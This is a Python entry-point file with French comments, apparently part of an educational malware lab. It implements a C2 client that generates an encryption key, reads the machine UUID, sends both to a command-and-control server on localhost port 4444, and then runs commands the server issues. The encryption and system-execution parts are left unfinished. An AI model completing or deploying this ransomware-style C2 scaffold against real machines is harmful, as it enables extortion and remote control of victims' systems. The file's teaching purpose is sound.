"""
main.py
-------

Point d'entrée du client pédagogique.

Ce script :
- génère une clé de chiffrement
- récupère l'UUID machine
- se connecte au serveur C2
- envoie les informations d'enregistrement
- écoute les commandes du serveur
- délègue leur traitement à commands.py

Les actions sensibles (chiffrement, exécution système, etc.)
sont volontairement laissées à compléter dans un environnement
de laboratoire contrôlé.
"""

from crypto import generate_key
from system import get_machine_uuid
from network import ClientConnection
from commands import handle_command
from pathlib import Path


SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444


def main():
    # -----------------------------
    # 1. Génération de la clé
    # -----------------------------
    key = generate_key()
    print("[INFO] Clé générée :", key)

    # -----------------------------
    # 2. Récupération de l'UUID
    # -----------------------------
    uuid = get_machine_uuid()
    print("[INFO] UUID machine :", uuid)

    # -----------------------------
    # 3. Connexion au serveur
    # -----------------------------
    conn = ClientConnection(SERVER_HOST, SERVER_PORT)
    conn.connect()
    print("[INFO] Connecté au serveur")

    # -----------------------------
    # 4. Envoi du message register
    # -----------------------------
    conn.send_json({
        "type": "register",
        "uuid": uuid,
        "key": key
    })
    print("[INFO] Informations envoyées au serveur")

    # -----------------------------
    # 5. Boucle principale
    # -----------------------------
    print("[INFO] En attente de commandes...")

    while True:
        message = conn.recv_json()

        if not message:
            continue

        response = handle_command(message, key)

        if response:
            conn.send_json(response)


if __name__ == "__main__":
    main()
